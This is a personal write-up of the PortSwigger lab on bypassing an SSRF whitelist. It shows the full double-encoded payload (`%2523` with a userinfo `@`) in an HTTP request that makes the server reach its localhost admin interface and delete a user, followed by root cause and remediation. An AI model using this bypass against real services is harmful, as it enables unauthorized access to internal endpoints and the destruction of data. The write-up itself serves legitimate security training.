# PortSwigger Lab: SSRF with whitelist-based input filter

**TAGS:** SSRF, Server-Side Request Forgery, Whitelist Bypass, URL Parsing, Double Encoding, Burp Suite

**Category:** SSRF  
**Date:** November 11, 2026  
**Day:** Wednesday  
**Link:** https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter  
**Published:** Ready  
**Status:** Done

---

## Intro

This is the fourth lab in my SSRF series.

In the previous lab, the application used a blacklist to prevent requests to internal services. I bypassed it using alternative IP representations and different ways of writing the same path.

This time, the application uses a whitelist.

Instead of blocking known dangerous destinations, it only allows requests to a specific hostname: `stock.weliketoshop.net`.

That sounds like a stronger defense, but what happens when different components interpret the same URL differently?

This lab explores how URL parsing and encoding inconsistencies can undermine hostname validation.

The write-up covers my reconnaissance, failed attempts, exploitation, root cause, impact, and remediation.

---

## Reconnaissance

#### Lab Description Lookup

The lab description explains that the stock check functionality is vulnerable to SSRF, but the application restricts requests to an approved hostname.

The objective is to bypass the whitelist, access the internal admin interface, and delete the user `carlos`.

I opened a product, clicked **Check stock**, and intercepted the request.

The relevant parameter was:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

The application uses the `stockApi` parameter to determine where the server should send its stock-check request.

My first test was straightforward:

```text
http://127.0.0.1/
```

The server rejected it:

```http
HTTP/2 400 Bad Request

"External stock check host must be stock.weliketoshop.net"
```

The error revealed the exact hostname expected by the application.

I needed to understand how the whitelist validated that hostname.

#### Testing the Userinfo Separator

URLs can contain user information before the hostname.

For example:

```text
http://username@hostname/
```

The `@` character separates the userinfo component from the actual hostname.

I tested:

```text
http://stock.weliketoshop.net@127.0.0.1/
```

The request was rejected with the same `400 Bad Request`.

This was expected because the actual hostname was `127.0.0.1`.

Next, I reversed the components:

```text
http://127.0.0.1@stock.weliketoshop.net/
```

This passed the whitelist, because the validator reads the hostname after the `@`. But it still sent the request to `stock.weliketoshop.net`, not to localhost. The `@` alone was not enough.

---

## Exploitation

#### The Double Encoding Trick

The character that actually broke the validation was `#`.

```text
http://username@stock.weliketoshop.net/      → accepted
http://username#@stock.weliketoshop.net/     → rejected
http://username%2523@stock.weliketoshop.net/ → Internal Server Error
```

When I double-encoded the `#` as `%2523`, the response changed to an Internal Server Error. That told me the server had tried to connect to a host called "username".

The trick is that the validator and the HTTP client decode the URL differently:

```text
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

The whitelist validator decodes it once. `%2523` becomes `%23`, so it still reads the hostname after the `@` as `stock.weliketoshop.net`. That passes.

The HTTP client decodes it again. `%23` becomes `#`, which starts a fragment. Now the client sees the hostname as `localhost:80` and ignores everything after the `#`.

The validator approves `stock.weliketoshop.net`, but the request actually reaches `localhost`.

#### Delete carlos

I sent the final URL:

```http
POST /product/stock HTTP/2
Host: 0a8e0020049ee364818b636900d8001a.web-security-academy.net
Cookie: session=A84jx5EL0s1WCQ8YIZgHijrf1DWZepkR
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

The server deleted `carlos` and the lab was solved.

---

## Root Cause

The whitelist validates the hostname after decoding the URL once, but the HTTP client decodes it a second time. The double-encoded `#` makes the validator see `stock.weliketoshop.net` while the client sees `localhost:80`. The two components disagree about the destination, and the attacker controls what each one sees.

---

## Impact

A whitelist is only as strong as the URL parser behind it. When validation and fetching interpret the URL differently, an attacker can reach the internal endpoints the whitelist was supposed to protect. Here that deleted a user. In a real application it could expose internal services.

---

## Remediation

- Use an allow-list and normalize the URL fully (decode and resolve the host) before validating.
- Reject embedded credentials and fragments in the URL.
- Validate the URL once, in one place, and reuse that same parsed value for fetching.
- Authenticate internal endpoints. Never rely on the hostname being "hidden".

---

## Key Takeaways

1. Whitelists fail when the validator and the fetcher parse the URL differently.
2. Double-URL-encoding (`%2523`) exploits that parsing gap.
3. Embedded credentials (`@`) and fragments (`#`) are the two parts to play with.
4. Always check what the server actually connects to, not just what passes the filter.

---

## References

- [PortSwigger — Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
- [PortSwigger — SSRF with whitelist-based input filter (lab)](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
- [OWASP — Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
